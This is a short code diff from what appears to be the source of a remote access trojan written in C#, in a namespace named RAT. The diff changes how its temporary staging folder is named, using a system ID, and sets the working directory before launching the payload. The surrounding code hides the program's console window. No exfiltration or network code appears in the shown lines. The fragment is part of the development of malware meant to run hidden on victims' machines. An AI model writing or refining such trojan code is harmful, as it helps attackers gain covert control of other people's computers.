@@ -68,7 +68,7 @@ namespace RAT
         }
         public static String[] files = new string[]
         {
-            Path.GetTempPath()+"\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316ieh2812812390dsfhfd8uasfi2823"
+            Path.GetTempPath()+SystemID
         };
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern bool FreeConsole();
@@ -93,7 +93,8 @@ namespace RAT
                         /*
                          * START PAYLOAD HERE
                          */
-                        RAT.Payload.main();
+                       Directory.SetCurrentDirectory(Path.GetTempPath() + SystemID);
+                       RAT.Payload.main();
                     }
                     else
                     {
